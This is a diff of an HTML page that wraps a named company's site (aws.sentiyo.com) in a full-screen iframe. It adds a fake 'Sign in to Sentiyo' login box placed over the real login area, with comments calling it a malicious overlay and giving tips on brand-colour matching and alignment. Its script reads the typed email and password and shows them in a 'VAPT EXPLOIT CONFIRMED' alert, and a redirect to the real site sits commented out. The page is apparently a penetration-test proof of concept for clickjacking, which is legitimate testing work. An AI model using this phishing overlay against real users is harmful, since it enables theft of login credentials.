@@ -3,27 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Management Console</title>
+    <title>Management Console - Sign In</title>
     <style>
-        /* Ensures the iframe takes up the whole screen without scrollbars */
+        /* Ensures the malicious wrapper fills the entire browser window */
         body, html {
             margin: 0;
             padding: 0;
             height: 100%;
             width: 100%;
             overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
-        /* Seamless full-screen iframe */
+        /* The legitimate site is loaded in the background */
         .target-frame { 
             border: none;
             width: 100vw; 
             height: 100vh;
             display: block;
+            z-index: 1;
         }
+
+        /* The Malicious Overlay: This box sits directly over the real login area */
+        .login-overlay {
+            position: absolute;
+            top: 45%; /* You may need to adjust this % to align with the real site's box */
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            z-index: 100; /* Ensures it is on top of the iframe */
+            width: 350px;
+            text-align: center;
+        }
+
+        .login-overlay h2 { margin-bottom: 20px; color: #333; font-size: 20px; }
+        
+        .login-overlay input {
+            width: 90%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .login-overlay button {
+            width: 98%;
+            padding: 12px;
+            background-color: #0056b3; /* Match the customer's brand color */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-overlay button:hover { background-color: #004494; }
     </style>
 </head>
 <body>
+
+    <div class="login-overlay">
+        <h2>Sign in to Sentiyo</h2>
+        <input type="text" id="fake_user" placeholder="Email or Username" required>
+        <input type="password" id="fake_pass" placeholder="Password" required>
+        <button onclick="captureData()">Login</button>
+    </div>
+
     <iframe src="https://aws.sentiyo.com" class="target-frame"></iframe>
+
+    <script>
+        function captureData() {
+            // Retrieve the data typed by the user into the fake form
+            const email = document.getElementById('fake_user').value;
+            const pass = document.getElementById('fake_pass').value;
+
+            // In a VAPT report, this alert serves as proof that data was stolen
+            alert("VAPT EXPLOIT CONFIRMED\n\n" + 
+                  "Attacker has captured the following:\n" +
+                  "Email: " + email + "\n" +
+                  "Password: " + pass);
+            
+            // Real attackers would now redirect the user to the actual site
+            // window.location.href = "https://aws.sentiyo.com";
+        }
+    </script>
+
 </body>
 </html>
